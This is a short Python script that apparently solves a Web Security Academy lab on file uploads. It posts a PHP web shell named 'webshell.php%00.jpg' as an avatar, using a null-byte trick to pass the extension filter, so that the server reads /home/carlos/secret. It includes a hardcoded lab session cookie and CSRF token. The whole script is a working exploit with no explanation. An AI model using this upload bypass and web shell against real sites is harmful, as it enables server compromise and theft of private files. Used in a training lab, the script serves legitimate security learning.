import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

# response = requests.get("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account?id=wiener")
multipart_data = MultipartEncoder(fields={
    'avatar': ('webshell.php%00.jpg', "<?php echo file_get_contents('/home/carlos/secret');", "image/jpeg"),
    'csrf': "ppP0cOArqEAJywpjk01eQEXQ9fwtKa7b",
    'user': "wiener"
})

headers = {
    "Cookie": "session=nMnoFTgdIRkE5Tx3ekHqmQ3xRmy930Jz",
    'Content-Type': multipart_data.content_type
}

response = requests.post("https://0a88003f0373832b84c5774e004d00d5.web-security-academy.net/my-account/avatar", headers=headers, data=multipart_data)

print(response.text, " - ", response.status_code)